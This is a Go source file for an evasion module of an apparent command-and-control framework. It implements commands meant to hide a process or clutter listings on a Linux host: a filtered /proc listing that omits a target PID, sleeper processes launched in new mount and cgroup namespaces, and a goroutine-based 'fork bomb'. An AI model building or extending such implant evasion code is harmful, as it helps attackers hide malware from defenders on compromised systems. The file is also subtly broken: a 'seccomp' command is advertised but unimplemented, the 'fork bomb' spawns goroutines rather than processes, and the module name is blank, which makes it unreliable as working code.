package evasion

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/simplified_c2/module"
)

// EvasionConfig holds configuration for process-hiding operations
type EvasionConfig struct {
	TargetPID int
	Verbose   bool
}

// Evasion is the core component for process-hiding techniques
type Evasion struct {
	Config EvasionConfig
}

// NewEvasion creates a new Evasion instance
func NewEvasion(config EvasionConfig) *Evasion {
	return &Evasion{
		Config: config,
	}
}

// Module implements module.ModuleInterface for process hiding
type Module struct {
	Name        string
	Description string
	Version     string
	Author      string
	hider       *Evasion
}

// NewModule creates a new EvasionModule instance
func NewModule() *Module {
	return &Module{
		Name:        "",
		Description: "Module for hiding processes using Linux techniques",
		Version:     "1.0.0",
		Author:      "Simplified C2",
		hider:       NewEvasion(EvasionConfig{}),
	}
}

// GetInfo returns the module's metadata
func (m *Module) GetInfo() *module.ModuleInfo {
	return &module.ModuleInfo{
		Name:        m.Name,
		Version:     m.Version,
		Description: m.Description,
		Author:      m.Author,
		Commands: []module.CommandInfo{
			{
				Name:        "proc",
				Description: "List processes, hiding the specified PID (demo)",
				Usage:       "proc <pid>",
				Options:     map[string]string{},
			},
			{
				Name:        "mount",
				Description: "Run a process in a new mount namespace",
				Usage:       "mount",
				Options:     map[string]string{},
			},
			{
				Name:        "cgroup",
				Description: "Run a process in a new cgroup namespace",
				Usage:       "cgroup",
				Options:     map[string]string{},
			},
			{
				Name:        "forkbomb",
				Description: "Spawn processes to clutter process listings",
				Usage:       "forkbomb",
				Options:     map[string]string{},
			},
			{
				Name:        "seccomp",
				Description: "Run a process with seccomp to block ptrace",
				Usage:       "seccomp",
				Options:     map[string]string{},
			},
		},
		Options: map[string]string{
			"enabled": "true",
		},
	}
}

// Initialize performs module setup
func (m *Module) Initialize() error {
	if os.Geteuid() != 0 && m.hider.Config.Verbose {
		fmt.Println("Warning: mount, cgroup, and seccomp require root privileges")
	}
	return nil
}

// ExecuteCommand runs the specified hiding technique
func (m *Module) ExecuteCommand(command string, args []string) (interface{}, error) {
	switch command {
	case "proc":
		if len(args) < 1 {
			return nil, fmt.Errorf("missing process ID")
		}
		pid := 0
		fmt.Sscanf(args[0], "%d", &pid)
		if pid <= 0 {
			return nil, fmt.Errorf("invalid process ID")
		}
		m.hider.Config = EvasionConfig{
			TargetPID: pid,
			Verbose:   true,
		}
		result, err := m.hider.ProcHide()
		if err != nil {
			return nil, err
		}
		return result, nil

	case "mount":
		m.hider.Config = EvasionConfig{
			Verbose: true,
		}
		result, err := m.hider.MountNamespace()
		if err != nil {
			return nil, err
		}
		return result, nil

	case "cgroup":
		m.hider.Config = EvasionConfig{
			Verbose: true,
		}
		result, err := m.hider.CgroupNamespace()
		if err != nil {
			return nil, err
		}
		return result, nil

	case "forkbomb":
		m.hider.Config = EvasionConfig{
			Verbose: true,
		}
		result, err := m.hider.ForkBomb()
		if err != nil {
			return nil, err
		}
		return result, nil

	default:
		return nil, fmt.Errorf("unknown command: %s", command)
	}
}

// ProcHide lists /proc entries, excluding the target PID
func (p *Evasion) ProcHide() (string, error) {
	if p.Config.Verbose {
		fmt.Printf("Listing processes, hiding PID %d\n", p.Config.TargetPID)
	}
	procDir := "/proc"
	files, err := ioutil.ReadDir(procDir)
	if err != nil {
		return "", fmt.Errorf("failed to read /proc: %v", err)
	}

	var pids []string
	for _, file := range files {
		if file.IsDir() && isNumeric(file.Name()) && file.Name() != strconv.Itoa(p.Config.TargetPID) {
			pids = append(pids, file.Name())
		}
	}
	result := fmt.Sprintf("PIDs (hiding %d): %s", p.Config.TargetPID, strings.Join(pids, ", "))
	return result, nil
}

// MountNamespace runs a process in a new mount namespace
func (p *Evasion) MountNamespace() (string, error) {
	if p.Config.Verbose {
		fmt.Println("Starting process in new mount namespace (requires root)")
	}
	cmd := exec.Command("/bin/sh", "-c", "mount -t proc proc /proc && sleep 3600")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Unshareflags: syscall.CLONE_NEWNS,
	}
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Start(); err != nil {
		return "", fmt.Errorf("failed to start mount namespace process: %v", err)
	}
	go func() {
		cmd.Wait()
	}()
	result := fmt.Sprintf("Started process with PID %d in new mount namespace", cmd.Process.Pid)
	return result, nil
}

// CgroupNamespace runs a process in a new cgroup namespace
func (p *Evasion) CgroupNamespace() (string, error) {
	if p.Config.Verbose {
		fmt.Println("Starting process in new cgroup namespace (requires root)")
	}
	cmd := exec.Command("/bin/sh", "-c", "sleep 3600")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Unshareflags: syscall.CLONE_NEWCGROUP,
	}
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Start(); err != nil {
		return "", fmt.Errorf("failed to start cgroup namespace process: %v", err)
	}
	go func() {
		cmd.Wait()
	}()
	result := fmt.Sprintf("Started process with PID %d in new cgroup namespace", cmd.Process.Pid)
	return result, nil
}

// ForkBomb spawns multiple processes to clutter listings
func (p *Evasion) ForkBomb() (string, error) {
	if p.Config.Verbose {
		fmt.Println("Starting fork bomb (limited to 100 processes)")
	}
	for i := 0; i < 100; i++ {
		go func(id int) {
			if p.Config.Verbose {
				fmt.Printf("Spawned process %d\n", id)
			}
			time.Sleep(1 * time.Hour)
		}(i)
		time.Sleep(10 * time.Millisecond)
	}
	return "Spawned 100 processes to clutter process listings", nil
}

// Seccomp runs a process with a seccomp filter

// isNumeric checks if a string is numeric
func isNumeric(s string) bool {
	_, err := strconv.Atoi(s)
	return err == nil
}
